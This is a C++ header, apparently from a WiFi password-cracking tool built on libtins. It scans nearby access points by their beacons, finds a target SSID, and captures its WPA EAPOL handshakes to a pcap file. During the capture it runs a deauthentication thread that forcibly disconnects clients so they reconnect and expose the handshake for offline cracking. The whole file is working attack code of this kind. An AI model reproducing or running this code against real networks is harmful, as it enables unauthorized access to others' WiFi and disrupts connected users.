#ifndef WIFI_PASSWORD_CRACKER_SNIFF_H
#define WIFI_PASSWORD_CRACKER_SNIFF_H

#include "std-tins.h"
#include "control.h"
#include "inject.h"

void viewNearbyWiFi(const string& wirelessIf, int maxWait = 2*MAX_CHANNEL*500/*ms*/, int channelPulse = 500/*ms*/) {
    ofstream ssid_file("../files/ssid-list");

    Sniffer sniffer(wirelessIf);
    sniffer.set_filter("subtype beacon");

    bool threadEnder = false;
    thread channelChanger(cycleChannels, wirelessIf, channelPulse, &threadEnder);
    auto lastResponse = steady_clock::now();

    unordered_set<string> ssidSet;
    ssidSet.insert("");
    while(true) {
        auto* mgmtFrame = ((PDU*) sniffer.next_packet())->find_pdu<Dot11ManagementFrame>();

        string ssid = mgmtFrame->ssid();
        if(ssidSet.find(ssid) == ssidSet.end()) {
            APStat AP(ssid, mgmtFrame->addr2(), mgmtFrame->ds_parameter_set());
            cout << AP.to_string() << flush;
            ssid_file << AP.to_string();

            ssidSet.insert(ssid);
            lastResponse = steady_clock::now();
        }
        else {
            if(duration_cast<milliseconds>(steady_clock::now()-lastResponse).count() >= maxWait) {
                cout << "Ending WiFi scanning..." << endl;
                cout << "[AP found: " << ssidSet.size()-1 << "]\n" << endl;
                threadEnder = true;
                channelChanger.join();
                return;
            }
        }

        delete mgmtFrame;
    }
}

APStat getAPStat(const string& ssid, const string& wirelessIf, int channelPulse = 300/*ms*/) {
    Sniffer sniffer(wirelessIf);
    sniffer.set_filter("subtype beacon");

    bool threadEnder = false;
    thread channelChanger(cycleChannels, wirelessIf, channelPulse, &threadEnder);

    while(true) {
        auto* mgmtFrame = ((PDU*) sniffer.next_packet())->find_pdu<Dot11ManagementFrame>();

        if(mgmtFrame->ssid() == ssid) {
            APStat AP(ssid, mgmtFrame->addr2(), mgmtFrame->ds_parameter_set());
            cout << AP.to_string() << flush;

            threadEnder = true;
            channelChanger.join();
            return AP;
        }

        delete mgmtFrame;
    }
}

void EAPOLCaptureThread(const APStat& AP, const string& wirelessIf, int deAuthPulse = 7000/*ms*/) {
    Sniffer sniffer(wirelessIf);
    sniffer.set_filter("ether proto 0x888e");

    unordered_map<HWAddress<6>,EapolShake> handShakeMap;
    PacketWriter writer("../files/eapol-" + AP.SSID, DataLinkType<RadioTap>());

    bool threadEnder = false;
    thread deAuth(deAuthThread, AP, wirelessIf, deAuthPulse, &threadEnder);

    while(true) {
        HWAddress<6> userMac;
        auto* radioFrame = ((PDU*) sniffer.next_packet())->find_pdu<RadioTap>();
        auto* dataFrame = radioFrame->find_pdu<Dot11Data>();

        if(dataFrame->addr1() == AP.MAC)
            userMac = dataFrame->addr2();
        else if(dataFrame->addr2() == AP.MAC)
            userMac = dataFrame->addr1();
        else {  //not this AP's EAPOL
            continue;
        }

        if(handShakeMap.find(userMac) == handShakeMap.end()) {
            handShakeMap.insert(make_pair(userMac,EapolShake()));
        }

        EapolShake& eapolShake = handShakeMap.find(userMac)->second;
        if(eapolShake.insert(radioFrame)) {
            threadEnder = true;

            for(auto* radioTap: eapolShake.radioEapol)
                writer.write(radioTap);

            cout << "EAPOL captured" << "\n" << endl;
            deAuth.join();
            return;
        }
    }
}

#endif //WIFI_PASSWORD_CRACKER_SNIFF_H
